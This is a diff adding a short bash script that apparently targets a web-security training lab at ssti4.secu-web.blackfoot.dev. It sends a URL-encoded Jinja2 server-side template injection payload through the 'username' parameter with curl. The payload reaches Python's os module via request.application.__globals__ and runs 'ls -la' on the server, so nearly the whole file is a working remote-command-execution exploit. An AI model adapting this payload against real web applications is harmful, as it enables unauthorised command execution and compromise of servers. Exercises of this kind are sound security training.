@@ -1,0 +1,6 @@
+#! /bin/bash
+set -B
+# for i in {5000..10000}; do
+  curl -s -k 'GET' 'https://ssti4.secu-web.blackfoot.dev/?username=%7B%7Brequest.application.__globals__.__builtins__.__import__%28%27os%27%29.popen%28%27ls+-la%27%29.read%28%29%7D%7D' | grep 'Hello'
+  # echo $i
+# done
